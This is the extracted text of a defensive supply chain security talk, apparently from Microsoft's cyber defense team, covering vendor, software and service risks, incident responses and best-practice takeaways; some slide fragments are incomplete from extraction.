We all know the world rests on a giant turtle…

1. Terry Pratchett, The Color of Magic, 1983

Turtles all the
way down…

I’m in your supply chain,
and you’re in mine.
We’re in this together.

Am I in your supply chain?

Are you in mine?

• Linux is the most popular OS
on Azure

• >35k unique OSS projects
• >10K 3rd party tools
• Surface, Hololens, Xbox
hardware suppliers

• Server infrastructure in the
Microsoft cloud

• And more…

Media is overly focused on hardware

Supply chain > hardware

Microsoft is a complex company to
defend… how do we do it?

Cyber Defense Operations Center – Defending as One

• Centralized hubs for cybersecurity and
defense; uniting personnel from each
defender team
• Shared technology, analytics,
playbooks
• Shared locations, and more
importantly a commitment to “defend
together”
• 24 x 7 x 365 protection of Microsoft
platform and customers

Let’s talk about people

People

There are people in your supply chain

vendor relationships

2019 After a thorough

investigation, no malicious

observed
Microsoft.

Response

• Risk assessment and vendor inventory audit performed
• Block newly identified malicious domains
• Precautionary reset of credentials for vendor accounts
• Additional monitoring of systems belonging vendor employees
• Windows Defender signature deployed to detect adversary’s specific Mimikatz Binary

within

Practical Advice
Securing people in your supply chain

• Always “assume breach”

• Strict inventory of vendor & partner access
• Automated policy governance where possible
• Follow principle of least privilege
• Provide devices and/or virtual monitoring
• Any privileged access needs tighter controls (MFA etc) and
detection systems in place

Let’s talk about software

Software

There is software in your supply chain

Software Supply Chain Example
1

April 2018 Reports that Team Viewer
software and/or infrastructure is
leveraged by threat actor

Threat Actor could leverage service to
install firmware or bios implants on
physical machines during OEM

Theoretically an implant could remain after provisioning:
• Steal data
• Disrupt or deny access
• Distribute and Manage Malware

May 2018
AppLocker and firewall blocking
initiated against service files and
connections

Response

• Performed audit of software usage to assess risk if software was compromised
• Update policy to block remote access software
• Notifications sent to impacted employees
• AppLocker and firewall blocks put in place
• Updated contracts with suppliers

Termination Support

Kick off security
engagements during
RFP and shortlisting
phase.

Enable the selection
of software solutions
and suppliers which
adhere to defined
Microsoft Security
requirements.

Perform security
assurance prior to
contract negotiations
to enable customers/
business groups to
make risk-based
decision.

Apply enforceable
terms to contracts in
relation to Microsoft
Security and Privacy
requirements.

Ensure suppliers are
committed to the
requirements set
forth for their
software solutions
and organization, and
their responsibility to
remediate any known
or open issues.

Perform monitoring
and periodic reassessments based
on the status of and
changes to the risk
profiles.
Investigate changes
in risk assessment
and move to
termination if they
cannot be quickly
addressed.

Implement necessary
safeguards for
solutions being
decommissioned and
provide termination
support.
Perform periodic
review of software
solution usage and
contract information
to identify solutions
which are inactive or
expected to be
decommissioned.

Let’s talk about services

Services

Do you inventory every service you use?

Upstream vs. Downstream

Response

• Inspected exposed data to evaluate risk

• Work began to investigate the scope and impact of the potential disclosure
• Investigated potential attempted or successful logins
• No misuse of the two-factor codes was identified

4 Takeaways

1
Share More
Let’s make the adversaries work harder
by working together.

How can we share more?
We need to change our cultural approach

• Media: “name and shame” → “learn and defend together”
• Customer: “why was there an issue” → “how did they respond?”
• Business: “containment & opacity” → “partnership & transparency”
• Disclosure: “code defects” → “tactics that work”

2
Response matters
We should focus more on how companies
respond to security events, not whether
they happen.

Remember, we’re all in this together
Best Practices:

• Proactively inform customer of impact
• Engage transparently and without defensiveness
• Respond to reasonable requests for validation
• Learn from mistakes

3
Sweat the small stuff
Adversaries will find the path of least
resistance.

4
Embrace the whole
People + Software + Services + Hardware
= Supply Chain

Thanks!
